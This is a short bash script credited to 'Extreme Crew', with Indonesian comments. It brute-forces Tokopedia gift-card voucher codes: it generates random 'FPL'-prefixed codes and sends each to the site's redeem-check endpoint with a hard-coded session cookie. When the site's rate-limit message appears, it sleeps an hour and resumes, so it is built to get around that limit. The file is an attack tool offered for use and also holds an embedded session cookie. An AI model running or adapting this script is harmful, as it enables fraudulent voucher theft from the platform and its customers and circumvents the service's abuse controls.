#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
clear
header
echo "1 Akun Max 10 kali generate"
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUzOTY2NTUyNHxJbTlRU1VjeVRrbGFUVXR2U3l0UFJrVm5lQzloYW5WM2QwVmxZM1JGWlRScFpHVTJNRTVJU2tnNGNVRTlJZ289fLfIDacqkp5wpzqG2xnW3UgjoAwhrZA4YE_BxKXuup1H; state=eyJyZWYiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tLyIsInV1aWQiOiI5NDY2MDgxNC1iMjFkLTRhYTItYjI4My03NmY1NTU4NjdmODUiLCJ0aGVtZSI6ImlmcmFtZSIsInAiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tLyJ9; _gac_UA-9801603-1=1.1539661961.EAIaIQobChMI2bjm04eK3gIVVA4rCh1g2w_LEAAYASAAEgIMs_D_BwE; insdrSV=11; l=1; vn_is=1; _gat_UA-9801603-1=1; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZTYzMTczNGEtMzdlZS00YjA5LTg5NDQtZmUxZGNmMmYyYjY3IiwiaXNfYWpheCI6dHJ1ZX0; pulsa-aff=undefined; _dc_gtm_UA-9801603-23=1; zarget_visitor_info=%7B%7D"
#ganti cok nya doang kontol
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	base="FPL$generate"
	ok=$(ngelog $base | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	echo "$base [ $ok ]"
	if [[ "$ok" =~ 'Anda telah mencoba lebih dari 10x' ]]; then
	secs=$((60 * 60))
		while [ $secs -gt 0 ]; do
   	echo -ne "Menunggu selama : $secs Untuk Auto Run :)\033[0K\r"
   	sleep 1
   	: $((secs--))
	done
	fi
done